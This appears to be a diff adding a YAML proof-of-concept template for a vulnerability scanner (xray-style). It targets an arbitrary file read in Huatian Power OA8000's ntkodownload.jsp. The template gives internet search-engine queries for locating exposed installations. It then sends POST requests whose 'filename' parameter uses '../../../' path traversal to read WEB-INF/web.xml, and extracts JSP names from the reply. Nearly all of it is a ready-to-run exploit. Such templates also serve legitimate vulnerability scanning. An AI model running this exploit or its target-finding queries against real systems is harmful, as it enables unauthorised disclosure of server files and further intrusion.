@@ -1,0 +1,58 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="华天动力-OA8000"
+    hunter-query: app.name="华天软件 OA"
+    quake-query: app:"华天动力OA"
+    zoomeye-query: app:"CNPOWER OA"
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips: 
+    
+name: poc-yaml-huatian-8000-ntkodownload.jsp-file-read
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /OAapp/jsp/trace/ntkodownload.jsp
+      follow_redirects: false      
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "filename=../../../OAapp/WEB-INF/web.xml"
+    expression: >-
+      response.status == 200 && response.body_string.contains("web-app")  && response.body_string.contains("xml version")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+  r1:
+    request:
+      method: POST
+      cache: true
+      path: /OAapp/jsp/trace/ntkodownload.jsp
+      follow_redirects: false      
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "filename=../../../Tomcat/webapps/OAapp/WEB-INF/web.xml"
+    expression: >-
+      response.status == 200 && response.body_string.contains("web-app")  && response.body_string.contains("xml version")
+
+expression: r0() || r1()
